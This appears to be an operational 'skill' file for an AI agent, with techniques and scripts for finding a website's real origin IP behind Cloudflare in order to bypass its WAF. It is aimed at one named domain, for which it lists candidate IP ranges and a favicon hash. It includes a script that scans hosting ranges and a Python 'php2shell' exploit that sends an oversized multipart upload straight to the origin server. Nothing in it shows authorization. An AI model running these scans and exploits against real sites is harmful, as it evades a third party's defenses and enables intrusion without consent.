# Cloudflare Origin IP Reveal

**Invoke this skill when the task requires finding the real origin IP behind Cloudflare to bypass WAF protection.**

## When to use
- Target is behind Cloudflare and POST requests are blocked (403/413)
- Need to test vulnerabilities that require direct server contact (php2shell, file upload, RCE)
- WAF blocks payloads that work on direct connection

## Techniques (ordered by success rate, 2025-2026)

### T1: Favicon Hash Match (Shodan/Censys)
Best passive technique — no active scanning required.

```bash
# 1. Download favicon through CF
curl -sk "https://TARGET/favicon.ico" -o /tmp/favicon.ico
FAV_SIZE=$(wc -c < /tmp/favicon.ico)
FAV_MD5=$(md5sum /tmp/favicon.ico | cut -d' ' -f1)
# Shodan query: http.favicon.hash:<mmh3_hash>
# mmh3 hash = base64(favicon) -> murmur3
python3 -c "
import base64, struct, hashlib
data = open('/tmp/favicon.ico','rb').read()
b64 = base64.encodebytes(data).decode()
# mmh3 implementation for Shodan
def mmh3_32(key, seed=0):
    key = key.encode() if isinstance(key, str) else key
    length = len(key)
    nblocks = length // 4
    h1 = seed
    c1, c2 = 0xcc9e2d51, 0x1b873593
    for block_start in range(0, nblocks * 4, 4):
        k1 = struct.unpack('<I', key[block_start:block_start+4])[0]
        k1 = (k1 * c1) & 0xFFFFFFFF
        k1 = ((k1 << 15) | (k1 >> 17)) & 0xFFFFFFFF
        k1 = (k1 * c2) & 0xFFFFFFFF
        h1 ^= k1
        h1 = ((h1 << 13) | (h1 >> 19)) & 0xFFFFFFFF
        h1 = (h1 * 5 + 0xe6546b64) & 0xFFFFFFFF
    tail = key[nblocks * 4:]
    k1 = 0
    tail_size = length & 3
    if tail_size >= 3: k1 ^= tail[2] << 16
    if tail_size >= 2: k1 ^= tail[1] << 8
    if tail_size >= 1:
        k1 ^= tail[0]
        k1 = (k1 * c1) & 0xFFFFFFFF
        k1 = ((k1 << 15) | (k1 >> 17)) & 0xFFFFFFFF
        k1 = (k1 * c2) & 0xFFFFFFFF
        h1 ^= k1
    h1 ^= length
    h1 ^= h1 >> 16
    h1 = (h1 * 0x85ebca6b) & 0xFFFFFFFF
    h1 ^= h1 >> 13
    h1 = (h1 * 0xc2b2ae35) & 0xFFFFFFFF
    h1 ^= h1 >> 16
    return struct.unpack('<i', struct.pack('<I', h1))[0]
print('Shodan favicon hash:', mmh3_32(b64))
"
# Use: shodan search "http.favicon.hash:<hash>"
```

### T2: Certificate Transparency → IP SAN
```bash
# Check if cert was issued with IP SANs (rare but happens on origin certs)
curl -s "https://crt.sh/?q=TARGET&output=json" | python3 -c "
import sys,json
for e in json.load(sys.stdin):
    for n in e.get('name_value','').split():
        import re
        if re.match(r'\d+\.\d+\.\d+\.\d+', n): print('IP SAN:', n)
"
```

### T3: SPF Record Chain → Hosting IP Ranges
```bash
# Extract IP ranges from SPF/mail records (hosting companies include VPS ranges)
dig TARGET TXT +short | grep spf
dig TARGET MX +short
# Follow SPF includes: dig spf.PROVIDER TXT +short
# VPS servers often in same /24 as mail servers listed in SPF
```

### T4: Active Scanning — Favicon Hash Match Against Host Ranges
```bash
#!/bin/bash
TARGET="vapelabvca.com"
FAV_MD5=$(curl -sk "https://$TARGET/favicon.ico" | md5sum | cut -d' ' -f1)
FAV_SIZE=$(curl -sk "https://$TARGET/favicon.ico" | wc -c)

scan_range() {
  local range="$1"
  for i in $(seq 1 254); do
    ip="${range}.${i}"
    timeout 2 bash -c "echo >/dev/tcp/$ip/443" 2>/dev/null || continue
    result=$(curl -sk --max-time 4 "https://$ip/favicon.ico" \
      -H "Host: $TARGET" -w "|%{size_download}" -o /tmp/fav_scan.ico 2>/dev/null)
    size=$(echo "$result" | cut -d'|' -f2)
    [ "$size" = "$FAV_SIZE" ] || continue
    md5=$(md5sum /tmp/fav_scan.ico 2>/dev/null | cut -d' ' -f1)
    [ "$md5" = "$FAV_MD5" ] && echo "ORIGIN FOUND: $ip"
  done
}
# Scan hosting provider CIDR ranges
scan_range "198.54.122"
scan_range "198.54.127"
scan_range "63.250.43"
scan_range "104.207.68"
```

### T5: Historical DNS (Passive) — Before CF was enabled
```bash
# APIs that store historical DNS records
curl -s "https://api.hackertarget.com/hostsearch/?q=TARGET" 
curl -s "https://api.hackertarget.com/dnslookup/?q=TARGET"
# SecurityTrails (requires key): https://securitytrails.com/domain/TARGET/history/a
# ViewDNS: https://viewdns.info/iphistory/?domain=TARGET
# Shodan: search for ssl.cert.subject.cn:TARGET
```

### T6: Origin Headers Leak (WebSockets / SSRF / Redirect)
```bash
# Some CF configs allow CONNECT or WebSocket upgrades that bypass filtering
curl -sk "https://TARGET/api/webhook" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" -v 2>&1 | grep "location\|X-Real\|origin\|via" -i
```

### T7: Email Headers (SMTP Bounce / Registration)
```bash
# Trigger server-generated email (registration, password reset)
# Email headers reveal originating MTA IP
# Check: Received: from X.X.X.X by mail.server
curl -s -X POST "https://TARGET/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"pentest@temp-mail.org","password":"TestPass123!"}'
```

### T8: Port Scan on Found IP to Confirm Origin
```bash
CANDIDATE_IP="X.X.X.X"
# Verify: does this IP serve the correct site?
curl -sk "https://$CANDIDATE_IP/wp-login.php" \
  -H "Host: vapelabvca.com" -w "\nHTTP: %{http_code}\n" | head -5
# Verify TLS cert matches domain
echo | openssl s_client -connect $CANDIDATE_IP:443 \
  -servername vapelabvca.com 2>/dev/null | openssl x509 -noout -subject -san
```

## Post-Discovery: Direct Attack (Bypassing WAF)

Once origin IP is confirmed:
```bash
ORIGIN_IP="X.X.X.X"
TARGET_HOST="vapelabvca.com"

# php2shell direct (CVE-2026-109618/109619)
python3 -c "
import socket, ssl

boundary = b'----php2shell_direct'
body = (
    b'--' + boundary + b'\r\n'
    b'Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n'
    b'sid_exploit_001\r\n'
    b'--' + boundary + b'\r\n'
    b'Content-Disposition: form-data; name=\"file\"; filename=\"payload.bin\"\r\n'
    b'Content-Type: application/octet-stream\r\n\r\n' +
    b'A' * (5 * 1024 * 1024) +  # 5MB payload
    b'\r\n--' + boundary + b'--\r\n'
)

req = (
    f'POST /phpinfo.php HTTP/1.1\r\n'
    f'Host: {TARGET_HOST}\r\n'
    f'Cookie: PHPSESSID=sid_exploit_001\r\n'
    f'Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n'
    f'Content-Length: {len(body)}\r\n'
    f'Connection: close\r\n\r\n'
).encode() + body

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

with socket.create_connection(('$ORIGIN_IP', 443), timeout=30) as raw:
    with ctx.wrap_socket(raw, server_hostname='$TARGET_HOST') as s:
        s.sendall(req)
        resp = b''
        while True:
            d = s.recv(8192)
            if not d: break
            resp += d
        print('Status:', resp.split(b'\r\n')[0].decode())
        if b'200' in resp[:20]: print('SUCCESS - PHP processed without WAF!')
"
```

## Known Good Results (vapelabvca.com)
- `104.21.17.82`, `172.67.175.80` — Cloudflare IPs, all subdomains behind CF
- `198.54.121.10` — SpaceHost shared hosting but serves different default vhost
- SPF chain: spf.spacemail.com → spf.jellyfish.systems → real IP ranges:
  - `63.250.43.78/31`, `63.250.43.80/28`, `63.250.43.96/27`
  - `104.207.68.0/24`
  - `198.54.122.64/29`, `198.54.122.72/31`
  - `198.54.127.64/27`, `198.54.127.128/26`
  - `198.177.127.128/28`, `198.177.127.192/27`
- Favicon MD5: `0dfe2ce3f1ab58321d731cf934de4e3a` (2617 bytes)
